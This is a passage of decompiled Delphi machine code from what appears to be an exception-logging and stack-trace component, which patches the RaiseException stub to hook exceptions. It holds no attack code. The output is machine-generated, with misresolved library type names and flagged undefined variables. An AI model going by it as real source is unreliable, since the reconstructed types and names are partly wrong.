  int v4[8]; // [esp+4h] [ebp-2Ch] BYREF
  unsigned int *v5; // [esp+24h] [ebp-Ch]
  int v6; // [esp+28h] [ebp-8h]
  unsigned int *v7; // [esp+2Ch] [ebp-4h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  if ( *(int *)(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) + 8) < 32 )
    sub_428180(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4), 32);
  v4[1] = 0;
  v4[2] = 0;
  if ( !*(_DWORD *)(a1 + 40) )
  {
    v6 = sub_42B210((int)&savedregs);
    *(_DWORD *)(a1 + 40) = v6;
  }
  v5 = *(unsigned int **)(a1 + 40);
  v7 = v5;
  v4[7] = (int)v5;
  *(_DWORD *)(a1 + 40) = (char *)v5 - 1;
  while ( 1 )
  {
    LOBYTE(v2) = sub_430C60(a1, &v7, v4);
    if ( !(_BYTE)v2 )
      break;
    v2 = sub_42B760(*(_DWORD *)(a1 + 4));
    if ( v2 == 4096 )
      break;
    sub_431260(a1, v4);
  }
  return v2;
}

//----- (00431050) --------------------------------------------------------
void __fastcall sub_431050(int *a1)
{
  unsigned int *v2; // ebx
  unsigned int v3; // edi
  unsigned int v4; // eax
  int v5; // [esp+Ch] [ebp-34h] BYREF
  int v6; // [esp+10h] [ebp-30h]
  int v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+2Ch] [ebp-14h]
  unsigned int *v9; // [esp+30h] [ebp-10h]
  void **v10; // [esp+34h] [ebp-Ch]
  unsigned int v11; // [esp+38h] [ebp-8h]
  int v12; // [esp+3Ch] [ebp-4h] BYREF

  if ( *(int *)(*(_DWORD *)(a1[1] + 4) + 8) < 32 )
    sub_428180(*(_DWORD *)(a1[1] + 4), 32);
  if ( !a1[10] )
  {
    v10 = sub_42B220();
    a1[10] = (int)v10;
  }
  v9 = (unsigned int *)a1[10];
  v2 = v9;
  v11 = a1[9];
  if ( sub_431120((int)a1) > 0 )
    v8 = *(_DWORD *)(sub_431240((int)a1, 0) + 4);
  sub_4051B8(&v5, 28, 0);
  v3 = 0;
  while ( 1 )
  {
    sub_42B250();
    if ( v4 >= v11 || sub_42B760(a1[1]) == 4096 )
      break;
    if ( sub_430DD0((int)a1, *v2, &v12, (BOOL)v2) )
    {
      if ( v3 != *v2 )
      {
        v5 = *v2 - v12;
        v3 = *v2;
        ++v6;
        sub_431260((int)a1, &v5);
        v7 = v5;
      }
    }
    ++v2;
  }
}
// 431106: variable 'v4' is possibly undefined

//----- (00431120) --------------------------------------------------------
int __fastcall sub_431120(int a1)
{
  return *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) + 8);
}

//----- (00431130) --------------------------------------------------------
_DWORD *__usercall sub_431130@<eax>(int a1@<eax>, int a2@<edx>, unsigned __int8 a3@<cl>, int a4@<edi>)
{
  int v5; // eax
  int v6; // ebx
  int v7; // edi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v10; // [esp-8h] [ebp-28h]
  int *v11; // [esp-4h] [ebp-24h]
  int v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h] BYREF
  const void *v14; // [esp+14h] [ebp-Ch]
  unsigned __int8 v15; // [esp+1Bh] [ebp-5h]
  int v16; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v13 = 0;
  v15 = a3;
  v16 = a2;
  v11 = &savedregs;
  v10 = &loc_4311F2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_BYTE *)(a1 + 52) )
    sub_429140(v16, (int)L"Raw:", 0, a4);
  else
    sub_429140(v16, (int)L"Frames:", 0, a4);
  v5 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4);
  if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
  {
    v6 = *(_DWORD *)(v5 + 8);
    v7 = 0;
    do
    {
      v14 = *(const void **)(sub_431240(a1, v7) + 4);
      sub_42F5D0(v14, v15, &v13);
      v12 = v13;
      sub_429140(v16, v13, 0, v7++);
      --v6;
    }
    while ( v6 );
  }
  if ( *(_BYTE *)(a1 + 52) && *(_DWORD *)(a1 + 64) )
    sub_431130(*(_DWORD *)(a1 + 64), v16, v15, v11, v10, ExceptionList);
  __writefsdword(0, (unsigned int)ExceptionList);
  v11 = (int *)&loc_4311F9;
  return sub_406C44(&v13);
}
// 43120C: using guessed type wchar_t aRaw[5];
// 431224: using guessed type wchar_t aFrames[8];

//----- (00431240) --------------------------------------------------------
int __fastcall sub_431240(int a1, unsigned int System::AnsiString)
{
  return sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(a1 + 4) + 4), System::AnsiString);
}

//----- (00431260) --------------------------------------------------------
int __fastcall sub_431260(int a1, int *a2)
{
  int v4; // eax
  int result; // eax
  int v6; // eax

  v4 = *(_DWORD *)(a1 + 32);
  if ( v4 == -1 && a2[1] > 0 || (result = v4 + 1, a2[1] > result) )
  {
    v6 = sub_405568((int)&cls_DebugStackInfoUtil_TStackInfoItem, 1);
    qmemcpy((void *)(v6 + 4), a2, 0x1Cu);
    return sub_427F40(*(_DWORD **)(*(_DWORD *)(a1 + 4) + 4), v6);
  }
  return result;
}
// 4302F8: using guessed type __int16 cls_DebugStackInfoUtil_TStackInfoItem;

//----- (00431310) --------------------------------------------------------
_DWORD *__fastcall sub_431310(int a1, int a2)
{
  const void *v4; // eax
  int v5; // ecx
  signed int v6; // edi
  int v7; // eax
  int v8; // eax
  int v9; // edi
  int v10; // eax
  unsigned int v12[2]; // [esp-Ch] [ebp-48h] BYREF
  int *v13; // [esp-4h] [ebp-40h]
  int v14; // [esp+Ch] [ebp-30h]
  int v15; // [esp+10h] [ebp-2Ch]
  char v16[4]; // [esp+14h] [ebp-28h] BYREF
  int cchCount1; // [esp+18h] [ebp-24h]
  __int32 v18; // [esp+1Ch] [ebp-20h]
  int v19; // [esp+38h] [ebp-4h] BYREF
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v19 = 0;
  sub_407D10((int)v16, (int)&byte_42EF78);
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_4314D2;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v4 = (const void *)sub_430720(a2);
  if ( v4 )
  {
    sub_42F380(v4, (int)v16, v5);
    if ( !sub_426AB0(cchCount1, (int)L"system") )
    {
      sub_407030(&v19, v18);
      v6 = sub_407B7C((int)&str___0[1], v19, 1);
      if ( v6 > 0 )
      {
        v14 = v19;
        if ( v19 )
          v14 = *(_DWORD *)(v14 - 4);
        sub_407AD8(v19, v6 + 1, v14 - v6, &v19);
      }
      if ( sub_426AB0(v19, (int)L"@HandleAnyException") )
      {
        if ( sub_426AB0(v19, (int)L"@HandleOnException") )
        {
          if ( sub_426AB0(v19, (int)L"@HandleAutoException") )
          {
            if ( !sub_426AB0(v19, (int)L"@HandleFinally") )
              *(_BYTE *)(a1 + 4) = 1;
          }
          else
          {
            *(_BYTE *)(a1 + 4) = 4;
          }
        }
        else
        {
          *(_BYTE *)(a1 + 4) = 3;
        }
      }
      else
      {
        *(_BYTE *)(a1 + 4) = 2;
      }
    }
    if ( *(_BYTE *)(a1 + 4) )
    {
      v7 = sub_430720(a2 + 5);
      *(_DWORD *)(a1 + 12) = v7;
      if ( !v7 )
        *(_DWORD *)(a1 + 12) = a2 + 5;
    }
    else
    {
      v8 = sub_430720(a2);
      *(_DWORD *)(a1 + 12) = v8;
      if ( !v8 )
        *(_DWORD *)(a1 + 12) = a2;
    }
    if ( *(_BYTE *)(a1 + 4) == 3 )
    {
      System::__linkproc__ DynArraySetLength(*(_DWORD *)(a2 + 5));
      if ( *(_DWORD *)(a2 + 5) - 1 >= 0 )
      {
        v15 = *(_DWORD *)(a2 + 5);
        v9 = 0;
        while ( *(_DWORD *)(a2 + 8 * v9 + 9) )
        {
          v10 = *(_DWORD *)(a1 + 16);
          *(_DWORD *)(v10 + 8 * v9) = *(_DWORD *)(a2 + 8 * v9 + 9);
          *(_DWORD *)(v10 + 8 * v9 + 4) = *(_DWORD *)(a2 + 8 * v9 + 13);
          ++v9;
          if ( !--v15 )
            goto LABEL_26;
        }
        System::__linkproc__ DynArraySetLength(v9);
      }
    }
  }
LABEL_26:
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_4314D9;
  sub_407DEC((int)v16, (int)&byte_42EF78);
  return sub_406C44(&v19);
}
// 431354: variable 'v5' is possibly undefined
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 42EF78: using guessed type char byte_42EF78;
// 4314EC: using guessed type wchar_t aSystem[7];
// 431500: using guessed type _strings str___0[1];
// 431518: using guessed type wchar_t aHandleanyexcep[20];
// 43154C: using guessed type wchar_t aHandleonexcept[19];
// 431580: using guessed type wchar_t aHandleautoexce[21];
// 4315B8: using guessed type wchar_t aHandlefinally[15];
// 431310: using guessed type char var_28[4];

//----- (004315E0) --------------------------------------------------------
BOOL __fastcall sub_4315E0(int a1, int *a2, _DWORD *a3)
{
  char v4; // al
  bool v5; // al
  int v6; // eax
  int v7; // eax
  int v8; // esi
  char v9; // bl
  char v10; // zf
  unsigned __int8 **v12; // [esp+14h] [ebp-20h]
  int v13; // [esp+18h] [ebp-1Ch]
  int v14; // [esp+1Ch] [ebp-18h]
  int v15; // [esp+20h] [ebp-14h]
  int v16; // [esp+24h] [ebp-10h]
  int v17; // [esp+28h] [ebp-Ch]
  bool v18; // [esp+2Fh] [ebp-5h]

  v4 = *(_BYTE *)(a1 + 4) - 2;
  v5 = !v4 || v4 == 2;
  v18 = v5;
  if ( v5 || *(_BYTE *)(a1 + 4) != 3 )
  {
    if ( v5 )
      *a3 = *(_DWORD *)(a1 + 12);
    else
      *a3 = 0;
  }
  else
  {
    *a3 = 0;
    v16 = *a2;
    v13 = *(_DWORD *)(a1 + 16);
    v6 = v13;
    if ( v13 )
      v6 = *(_DWORD *)(v13 - 4);
    v7 = v6 - 1;
    if ( v7 >= 0 )
    {
      v14 = v7 + 1;
      v17 = 0;
      do
      {
        v8 = v16;
        v18 = *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * v17) == 0;
        while ( !v18 && v8 )
        {
          if ( v8 == *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * v17) )
          {
            v9 = 1;
          }
          else
          {
            v12 = (unsigned __int8 **)(**(_DWORD **)(*(_DWORD *)(a1 + 16) + 8 * v17) - 56);
            System::__linkproc__ AStrCmp(*v12, *(_DWORD *)(v8 - 56), **v12 + 1);
            v9 = v10;
          }
          v18 = v9;
          if ( v9 )
          {
            *a3 = *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * v17 + 4);
          }
          else
          {
            v15 = sub_40552C(v8);
            if ( v8 == v15 )
              v8 = 0;
            else
              v8 = v15;
          }
        }
        if ( v18 )
          break;
        ++v17;
        --v14;
      }
      while ( v14 );
    }
  }
  return v18;
}
// 43169D: variable 'v10' is possibly undefined
// 4071D8: using guessed type int __fastcall System::__linkproc__ AStrCmp(_DWORD, _DWORD, _DWORD);

//----- (00431960) --------------------------------------------------------
int __fastcall sub_431960(int a1, int a2)
{
  int v3; // esi

  v3 = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(*(_DWORD *)(a2 + 4));
  sub_427F40(*(_DWORD **)(*(_DWORD *)(a1 + 4) + 4), v3);
  return v3;
}
// 4312B0: using guessed type _DWORD __stdcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD);

//----- (00431990) --------------------------------------------------------
int __fastcall sub_431990(int a1, unsigned int System::AnsiString)
{
  return sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(a1 + 4) + 4), System::AnsiString);
}

//----- (004319B0) --------------------------------------------------------
int __fastcall sub_4319B0(int a1)
{
  int v2; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *i; // ebx
  int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  PEXCEPTION_ROUTINE Handler; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  sub_42B740(*(_DWORD *)(a1 + 4));
  v9 = sub_42C240(a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_431A2C;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v2 = 0;
  for ( i = sub_42B230(); ; i = i->Next )
  {
    sub_42B250();
    if ( v4 == -1 )
      break;
    if ( v2 >= *(_DWORD *)(a1 + 32) )
    {
      Handler = i->Handler;
      if ( sub_42C520(v9, Handler) )
        sub_431960(a1, (int)i);
    }
    ++v2;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_431A33;
  return sub_42C250((_DWORD **)&v9);
}
// 431A14: variable 'v4' is possibly undefined

//----- (00431A40) --------------------------------------------------------
void sub_431A40()
{
  __int64 v0; // rax
  int *v1; // ebx
  _DWORD *v2; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  char v5; // [esp+7h] [ebp-5h]
  Idthreadsafe::TIdThreadSafeStringList *v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v0 = System::__linkproc__ BeforeDestruction();
  v5 = BYTE4(v0);
  v6 = (Idthreadsafe::TIdThreadSafeStringList *)v0;
  v1 = (int *)sub_428380(v0);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_431A99;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  while ( v1[2] > 0 )
  {
    v2 = (_DWORD *)sub_428060((Idthreadcomponent::TIdThreadComponent *)v1, 0);
    sub_405598(v2);
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_431AA0;
  sub_428600(*((_DWORD *)v6 + 2));
  Idthreadsafe::TIdThreadSafeStringList::~TIdThreadSafeStringList(v6);
  if ( v5 > 0 )
    System::__linkproc__ ClassDestroy(v6);
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (00431AD0) --------------------------------------------------------
int __fastcall sub_431AD0(int a1, int *a2)
{
  Idthreadcomponent::TIdThreadComponent *v3; // edi
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v7[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = a1;
  a2[7] = a1;
  a2[6] = (int)sub_431C60;
  v3 = (Idthreadcomponent::TIdThreadComponent *)sub_428380(v9);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_431B4C;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v4 = sub_431B60(v9, a2[2], *a2);
  v5 = (_DWORD *)v4;
  if ( v4 )
  {
    sub_428150(v3, v4, 0);
    sub_405598(v5);
  }
  sub_427F40(v3, (int)a2);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_431B53;
  return sub_428600(*(_DWORD *)(v9 + 8));
}

//----- (00431B60) --------------------------------------------------------
int __fastcall sub_431B60(int a1, int a2, int a3)
{
  DWORD CurrentThreadId_0; // ebx
  int v4; // esi
  unsigned int v5; // edi
  int *v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v9; // [esp-4h] [ebp-24h]
  Idthreadcomponent::TIdThreadComponent *v10; // [esp+Ch] [ebp-14h]
  int *v11; // [esp+10h] [ebp-10h]
  int v12; // [esp+14h] [ebp-Ch]
  int v13; // [esp+18h] [ebp-8h]
  int v14; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = a3;
  v13 = a2;
  v14 = a1;
  v11 = 0;
  v10 = (Idthreadcomponent::TIdThreadComponent *)sub_428380(a1);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_431C04;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( *(_BYTE *)(v14 + 20) )
  {
    CurrentThreadId_0 = GetCurrentThreadId_0();
    if ( CurrentThreadId_0 == sub_4239B0() )
      v13 = *(_DWORD *)(v14 + 16);
  }
  if ( *((_DWORD *)v10 + 2) - 1 >= 0 )
  {
    v4 = *((_DWORD *)v10 + 2);
    v5 = 0;
    while ( 1 )
    {
      v6 = (int *)sub_428060(v10, v5);
      if ( v6[2] == v13 && sub_40576C(v6, v12) )
        break;
      ++v5;
      if ( !--v4 )
        goto LABEL_10;
    }
    v11 = v6;
  }
LABEL_10:
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_431C0B;
  sub_428600(*(_DWORD *)(v14 + 8));
  return (int)v11;
}

//----- (00431C20) --------------------------------------------------------
int __fastcall sub_431C20(int a1, int a2)
{
  return sub_431B60(a1, a2, (int)&cls_DebugStackInfoUtil_TStackInfoList);
}
// 4303A4: using guessed type __int16 cls_DebugStackInfoUtil_TStackInfoList;

//----- (00431C40) --------------------------------------------------------
int __fastcall sub_431C40(int a1, int a2)
{
  return sub_431B60(a1, a2, (int)&cls_DebugStackInfoUtil_TExceptFrameList);
}
// 43056C: using guessed type __int16 cls_DebugStackInfoUtil_TExceptFrameList;

//----- (00431C60) --------------------------------------------------------
int __fastcall sub_431C60(int a1, int a2)
{
  Idthreadcomponent::TIdThreadComponent *v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v6; // [esp-4h] [ebp-Ch]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v7 = a1;
  v3 = (Idthreadcomponent::TIdThreadComponent *)sub_428380(a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_431CA2;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_428150(v3, a2, 0);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_431CA9;
  return sub_428600(*(_DWORD *)(v7 + 8));
}

//----- (00431CB0) --------------------------------------------------------
_DWORD *sub_431CB0()
{
  _DWORD *v0; // eax
  _DWORD *result; // eax

  if ( !++dword_46EDA0 )
  {
    v0 = (_DWORD *)dword_466BD8;
    dword_466BD8 = 0;
    return sub_405598(v0);
  }
  return result;
}
// 466BD8: using guessed type int dword_466BD8;
// 46EDA0: using guessed type int dword_46EDA0;

//----- (00431CD0) --------------------------------------------------------
bool __fastcall sub_431CD0(int *a1)
{
  return sub_40576C(a1, (int)off_4133D0);
}
// 4133D0: using guessed type int (*off_4133D0[2])();

//----- (00431D00) --------------------------------------------------------
int *__userpurge sub_431D00@<eax>(int a1@<edx>, char a2@<cl>, long double a3@<st0>, int a4)
{
  int v5; // esi
  bool v6; // bl
  int v7; // eax
  int v8; // ecx
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v5 = a4;
  v6 = (*(_BYTE *)off_467EF0 & 4) != 0;
  if ( a4 )
  {
    v7 = -1;
  }
  else
  {
    v5 = sub_42B210((int)&savedregs);
    v7 = 1;
  }
  if ( a2 )
  {
    if ( v7 == -1 )
      v7 = 0;
    else
      ++v7;
    v8 = a1;
  }
  else
  {
    v8 = 0;
  }
  return sub_4307C0(v6, v7, v8, a3, v5);
}
// 467EF0: using guessed type void *off_467EF0;

//----- (00431D60) --------------------------------------------------------
char sub_431D60()
{
  if ( dword_466BDC )
  {
    ++dword_466BDC;
    return 0;
  }
  else if ( (unsigned __int8)sub_4320B0() )
  {
    dword_466BDC = 1;
    return 1;
  }
  else
  {
    return 0;
  }
}
// 466BDC: using guessed type int dword_466BDC;

//----- (00431DA0) --------------------------------------------------------
char sub_431DA0()
{
  if ( dword_466BDC == 1 )
  {
    --dword_466BDC;
    return 1;
  }
  else
  {
    if ( dword_466BDC > 0 )
      --dword_466BDC;
    return 0;
  }
}
// 466BDC: using guessed type int dword_466BDC;

//----- (00431DD0) --------------------------------------------------------
char __userpurge sub_431DD0@<al>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, long double a4@<st0>, int a5)
{
  int *v6; // ebx
  int *v7; // esi

  v6 = a1;
  if ( dword_466BDC > 0 )
  {
    if ( a1 )
    {
      LOBYTE(a1) = sub_40576C(a1, dword_465C10);
      if ( !(_BYTE)a1 )
      {
        if ( !sub_431CD0(v6) || (a1 = (int *)sub_430860(), a1 != (int *)dword_466BE0) || !dword_466BE0 )
        {
          if ( (*(_BYTE *)off_467EF0 & 1) != 0 )
          {
            v7 = sub_431D00(a2, a3, a4, a5);
            if ( sub_431CD0(v6) )
              dword_466BE0 = (int)v7;
          }
          LOBYTE(a1) = sub_431CD0(v6);
          if ( !(_BYTE)a1 )
          {
            LOBYTE(a1) = (_BYTE)off_467EF0;
            if ( (*(_BYTE *)off_467EF0 & 2) != 0 )
              LOBYTE(a1) = (unsigned __int8)sub_430790(3);
          }
        }
      }
    }
  }
  return (char)a1;
}
// 465C10: using guessed type int dword_465C10;
// 466BDC: using guessed type int dword_466BDC;
// 466BE0: using guessed type int dword_466BE0;
// 467EF0: using guessed type void *off_467EF0;

//----- (00431E90) --------------------------------------------------------
int __userpurge sub_431E90@<eax>(int *a1@<eax>, int a2@<edx>, char a3@<cl>, long double a4@<st0>, int a5)
{
  int result; // eax
  unsigned int v9[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v10; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = Sysinit::__linkproc__ GetTls();
  if ( !*(_BYTE *)(result + 16) )
  {
    *(_BYTE *)(Sysinit::__linkproc__ GetTls() + 16) = 1;
    *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 20) = 0;
    v10 = &savedregs;
    v9[1] = (unsigned int)&loc_431EFA;
    v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v9);
    sub_431DD0(a1, a2, a3, a4, a5);
    __writefsdword(0, v9[0]);
    v10 = (int *)&loc_431F01;
    result = Sysinit::__linkproc__ GetTls();
    *(_BYTE *)(result + 16) = 0;
  }
  return result;
}

//----- (00431F10) --------------------------------------------------------
int __fastcall sub_431F10(int a1)
{
  int v2; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v7 = 0;
  if ( !*(_BYTE *)(((int (*)(void))Sysinit::__linkproc__ GetTls)() + 16) )
  {
    *(_BYTE *)(((int (*)(void))Sysinit::__linkproc__ GetTls)() + 16) = 1;
    v6 = &savedregs;
    v5 = &loc_431F69;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    v7 = dword_46EDB4(a1, v2);
    __writefsdword(0, (unsigned int)v5);
    *(_BYTE *)(Sysinit::__linkproc__ GetTls(&loc_431F70) + 16) = 0;
  }
  return v7;
}
// 431F46: variable 'v2' is possibly undefined
// 40B790: using guessed type int __cdecl Sysinit::__linkproc__ GetTls(_DWORD);
// 46EDB4: using guessed type int (__fastcall *dword_46EDB4)(_DWORD, _DWORD);

//----- (00431F80) --------------------------------------------------------
int *__usercall sub_431F80@<eax>(int a1@<eax>, long double a2@<st0>)
{
  int *v3; // esi
  int v4; // eax
  int v5; // eax
  struct _EXCEPTION_POINTERS ExceptionInfo; // [esp+8h] [ebp-8h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v3 = (int *)sub_431F10(a1);
  if ( *(_DWORD *)a1 != 1080890248 )
  {
    if ( byte_466BE4 )
    {
      ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)a1;
      ExceptionInfo.ContextRecord = *(PCONTEXT *)(sub_42B210((int)&savedregs) + 36);
      TopLevelExceptionFilter(&ExceptionInfo);
    }
    v4 = sub_42B210((int)&savedregs);
    sub_431E90(v3, *(_DWORD *)(a1 + 12), 1, a2, v4);
    v5 = *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 20);
    if ( v5 )
      return (int *)v5;
  }
  return v3;
}
// 466BE4: using guessed type char byte_466BE4;

//----- (00431FF0) --------------------------------------------------------
int __userpurge sub_431FF0@<eax>(long double a1@<st0>, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( (a3 == 1 || a3 == -1073741787) && a2 == 250477278 && (unsigned int)(a4 - 7) < 2 && &a6 == (int *)a5 )
  {
    v6 = sub_42B210((int)&savedregs);
    sub_431E90(*(int **)(a5 + 4), *(_DWORD *)a5, 0, a1, v6);
  }
  return dword_46EDB0(a2, a3, a4, a5);
}
// 46EDB0: using guessed type int (__stdcall *dword_46EDB0)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00432070) --------------------------------------------------------
int __fastcall sub_432070(_DWORD *a1)
{
  if ( a1 )
    *a1 = 0;
  sub_408B34(a1, (int)&byte_42B038);
  return 0;
}
// 42B038: using guessed type char byte_42B038;

//----- (004320B0) --------------------------------------------------------
int sub_4320B0()
{
  _DWORD *v0; // eax
  unsigned int v2[6]; // [esp-Ch] [ebp-20h] BYREF
  int (__userpurge *v3)@<eax>(long double@<st0>, int, int, int, int, int); // [esp+Ch] [ebp-8h] BYREF
  char v4; // [esp+12h] [ebp-2h]
  unsigned __int8 v5; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v5 = 0;
  if ( byte_46EDA8 )
  {
    return 1;
  }
  else
  {
    *(_BYTE *)(Sysinit::__linkproc__ GetTls() + 16) = 0;
    dword_46EDB0 = 0;
    v4 = 0;
    sub_42B260(&cls_System_TObject);
    v0 = sub_408B34(&dword_46EDAC, (int)&byte_42A3D0);
    if ( (unsigned __int8)sub_42A590(0, 0, v0, sub_431FF0) )
    {
      dword_46EDB0 = *(int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD))dword_46EDAC;
      v4 = 1;
    }
    if ( !v4 )
    {
      v2[2] = (unsigned int)&savedregs;
      v2[1] = (unsigned int)&loc_432179;
      v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v2);
      if ( *(_WORD *)RaiseException_2 == 9727 )
      {
        dword_46EDB0 = **(int (__stdcall ***)(_DWORD, _DWORD, _DWORD, _DWORD))((char *)RaiseException_2 + 2);
        v3 = sub_431FF0;
        sub_42A770(*(void **)((char *)RaiseException_2 + 2), &v3, 4u);
        v4 = 1;
      }
      __writefsdword(0, v2[0]);
    }
    if ( v4 )
    {
      v5 = 1;
      dword_46EDB4 = (int (__fastcall *)(_DWORD, _DWORD))*off_467F9C;
      *off_467F9C = (int)sub_431F80;
    }
    byte_46EDA8 = v5;
  }
  return v5;
}
// 401530: using guessed type __int16 cls_System_TObject;
// 42A3D0: using guessed type char byte_42A3D0;
// 42A590: using guessed type _DWORD __stdcall sub_42A590(_DWORD, char, _DWORD, _DWORD);
// 467F9C: using guessed type int *off_467F9C;
// 46EDA8: using guessed type char byte_46EDA8;
// 46EDAC: using guessed type int dword_46EDAC;
// 46EDB0: using guessed type int (__stdcall *dword_46EDB0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 46EDB4: using guessed type int (__fastcall *dword_46EDB4)(_DWORD, _DWORD);
// 4320B0: using guessed type int (__userpurge *var_8)@<eax>(long double a1@<st0>, int a2, int a3, int a4, int a5, int a6);

//----- (00432200) --------------------------------------------------------
int sub_432200()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_432237;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46EDA4 )
    sub_408B34(&dword_46EDAC, (int)&byte_42A3D0);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42A3D0: using guessed type char byte_42A3D0;
// 46EDA4: using guessed type int dword_46EDA4;
// 46EDAC: using guessed type int dword_46EDAC;

//----- (00432410) --------------------------------------------------------
void __usercall __noreturn sub_432410(int *a1@<eax>, const void *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  if ( dword_466BF0 )
  {
    sub_433B30(dword_466BF0, (int)a1, a2);
    sub_433170((int *)dword_466BF0, 0, a1, a4, a5);
  }
  sub_406AA4(1, a3);
}
// 466BF0: using guessed type int dword_466BF0;

//----- (00432460) --------------------------------------------------------
void *sub_432460()
{
  void *result; // eax

  result = off_468200;
  *(_DWORD *)off_468200 = 0;
  return result;
}
// 468200: using guessed type void *off_468200;

//----- (00432480) --------------------------------------------------------
int __usercall sub_432480@<eax>(int a1@<eax>, int a2@<edx>, int a3@<esi>)
{
  int v3; // ecx
  HANDLE CurrentProcess; // eax
  int v5; // ecx
  unsigned int v7; // [esp-4Ch] [ebp-514h]
